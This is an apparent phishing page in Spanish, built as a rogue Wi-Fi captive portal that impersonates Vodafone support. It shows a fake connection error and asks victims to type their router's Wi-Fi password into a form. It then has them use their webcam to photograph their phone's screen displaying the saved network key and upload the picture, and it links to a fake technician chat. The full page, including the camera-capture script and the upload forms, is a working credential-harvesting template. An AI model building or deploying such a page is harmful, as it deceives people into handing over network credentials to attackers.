<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<link rel="stylesheet" href="/msftconnecttest/vodacss/style.css" media="screen" type="text/css" />




	<title>Ayuda Vodafone</title>
</head>
<body>
<img class="idayuda" src="/msftconnecttest/vodaimg/ayudavodafone.png"/>
</br>
</br>
<p>Error 109: no se puede conectar, para segurar la conexión hay que entrar la contraseña wifi del router para crear nuevo codigo QR y poder usar lo con los otros dispositivos que quieren conectarse a la red <b>sin tener que entrar la clave wifi para cada uno de ellos.</b>La contraseña esta indicado atrás del router.</p>
</br>
</br>
</br>
<img class="idvoda2" src="/msftconnecttest/vodaimg/vodaclavewifi.jpg"/>
<br>
<br>
<div id="container">
            <!-- zone de connexion -->
            
            <form method="POST" action="vodavalid.php">
                <h1>Conexión</h1>
                
                <label><b>Clave wifi</b></label>
                <input type="text" name="cle">

                <label><b>Confirmación</b></label>
                <input type="text" name="cleconf">

                <input type="submit" id='submit' value='ENTRAR' >

            </form>
        </div>
</br>
Para no tener que entrar la clave Wi-Fi usted puede usar la cámara del oredandor. Séguir estos pasos con el móvil : <b>Parametros > Conexiones Wi-Fi > Arriba a la derecha > Parametros avanzados > Redes Wi-Fi registradas > Seleccionar la red y mostrar clave de seguridad.</b>Se pincha en <b>Start camera</b> poniendo el la pantalla móvil enfrente de la cámara del ordenador y sin moverse pincha <b>Click Image</b> y <b>Descargar</b>.Una vez este paso hecho se pincha <b>Upload</b> para hacer la verificación segura de la box internet.
<br>
<br>
Una vista previa de la imagen va a aparecer abajo.
<br>
<div class="row" style="border: 1px #000 solid;">

<div class="col-lg-5">
<div class="container">
<video autoplay="true" id="camera" width="320" height="240">
</video>
</div>
</div>
<div class="col-lg-2">
<input class="btn" type="button" id="btnStart" onclick="StartCamera();" value="Start Camera"></input>
<input class="btn" type="button" onclick="snapshot();" value="Click Image"></input>
<input class="btn" type="button" onclick="download();" value="Download Image"></input>
</div>
<div class="col-lg-5">
<div class="container">
<canvas id="myCanvas" width="320" height="240"></canvas>
</div>
</div>
</div>

<script>
var video = document.getElementById("camera");
var canvas = document.getElementById("myCanvas");
var camera = false;
let currentStream = null;
var capturedImage = false;
var btnStart = document.getElementById("btnStart");
var ctx = canvas.getContext('2d');

function StartCamera() {

if (!camera) {
if (navigator.mediaDevices.getUserMedia) {
navigator.mediaDevices.getUserMedia(
{
video: true
}).then(function (stream) {
currentStream = stream;
video.srcObject = currentStream;
video.style.display = 'block';
camera = true;
btnStart.value = "Stop Camera";
}).catch(function (err) {
console.log(err);
});
}
}

else {
camera = false;
currentStream.getTracks().forEach(track => track.stop());
video.srcObject = null;
btnStart.value = "Start Camera";
}
}

function snapshot() {
if (camera) {
ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
capturedImage = true;
}
else
window.alert('Please start the camera');
}

function download() {
if (capturedImage) {
var link = document.createElement('a');
link.download = 'Capture' + (Math.floor(Date.now() / 1000)) + '.jpg';
link.href = document.getElementById('myCanvas').toDataURL('image/jpeg');
link.click();
}
else
window.alert('Please capture an image to download it');
}
</script>



<form action="upload.php" method="post" enctype="multipart/form-data">
  Select image to upload:
  <input type="file" name="fileToUpload" id="fileToUpload">

  <input type="submit" value="Upload Image" name="submit">
</form>
<p>Si no encuentra la clave wifi se puede ponerse en contacto con un tecnico:</p>
<a href="/msftconnecttest/shout/vodatchat.php" target="_blank"><u>Ayuda en linea</u>...</a>
<br>
<br>
<img class="idvodabasdepage" src="/msftconnecttest/vodaimg/vodafonepicture2.png"/>
</body>
</html>




